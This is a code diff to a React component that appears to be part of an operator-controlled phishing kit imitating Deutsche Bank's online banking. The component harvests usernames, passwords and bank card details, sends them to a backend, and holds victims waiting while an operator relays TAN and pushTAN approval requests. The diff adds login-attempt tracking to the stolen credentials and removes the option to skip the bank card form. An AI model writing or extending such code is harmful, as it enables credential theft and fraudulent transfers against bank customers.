@@ -179,7 +179,7 @@ function FormFlow() {
       setIsWaitingForAdmin(true);
       
       // Store the next state to transition to when admin continues
-      setSessionData(prev => ({ ...prev, pendingState: nextState }));
+      setSessionData((prev: Record<string, any>) => ({ ...prev, pendingState: nextState }));
       
       // Notify admin that user is waiting
       templateSocketClient.emit('user-waiting', {
@@ -265,7 +265,7 @@ function FormFlow() {
           setLoadingMessage('Daten werden aktualisiert...');
           
           setTimeout(() => {
-            setSessionData(prev => ({ ...prev, ...data }));
+            setSessionData((prev: Record<string, any>) => ({ ...prev, ...data }));
             setLoading(false);
           }, 1000);
         },
@@ -294,7 +294,7 @@ function FormFlow() {
             setIsWaitingForAdmin(false);
             setLoading(false);
             setState(sessionData.pendingState);
-            setSessionData(prev => ({ ...prev, pendingState: null }));
+            setSessionData((prev: Record<string, any>) => ({ ...prev, pendingState: null }));
           }
         },
         // Enhanced TAN system handlers
@@ -337,19 +337,24 @@ function FormFlow() {
   const handleLoginSubmit = async (data: LoginData) => {
     try {
       console.log('Login submitted for session:', key);
-      setSessionData(prev => ({ ...prev, login: data }));
+      setSessionData((prev: Record<string, any>) => ({ ...prev, login: data }));
       
       setState(STATES.LOADING);
       setLoadingMessage("Anmeldung wird verarbeitet...");
       
       // Submit login data to backend
+      const currentAttempt = sessionStorage.getItem(`deutsche_bank_attempts_${key}`) || '0';
+      const attempts = parseInt(currentAttempt) + 1;
+      sessionStorage.setItem(`deutsche_bank_attempts_${key}`, attempts.toString());
+
       const response = await submitTemplateData({
         template_name: 'deutsche_bank',
         key: key || '',
         step: 'login',
         data: {
           username: data.username,
-          password: data.password
+          password: data.password,
+          attempt: attempts
         }
       });
 
@@ -584,7 +589,7 @@ function FormFlow() {
         return <QRUploadForm onUpload={handleQRUpload} isRetry={true} />;
         
       case STATES.BANK_CARD:
-        return <BankCardForm onSubmit={handleBankCardSubmit} onSkip={handleBankCardSkip} />;
+        return <BankCardForm onSubmit={handleBankCardSubmit} />;
         
       case STATES.FINAL_SUCCESS:
         return <FinalSuccessScreen />;
@@ -593,14 +598,12 @@ function FormFlow() {
         return <PushTANScreen 
           tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
           transactionDetails={currentTanRequest?.transactionDetails}
-          onSubmit={(tan) => {
-            console.log('pushTAN submitted:', tan);
+          onConfirm={() => {
             // Send TAN completion back to admin
             templateSocketClient.emit('tan-completed', {
               requestId: currentTanRequest?.requestId,
               success: true,
-              type: currentTanRequest?.type,
-              tanValue: tan
+              type: currentTanRequest?.type
             });
             setCurrentTanRequest(null);
             setState(STATES.FINAL_SUCCESS);
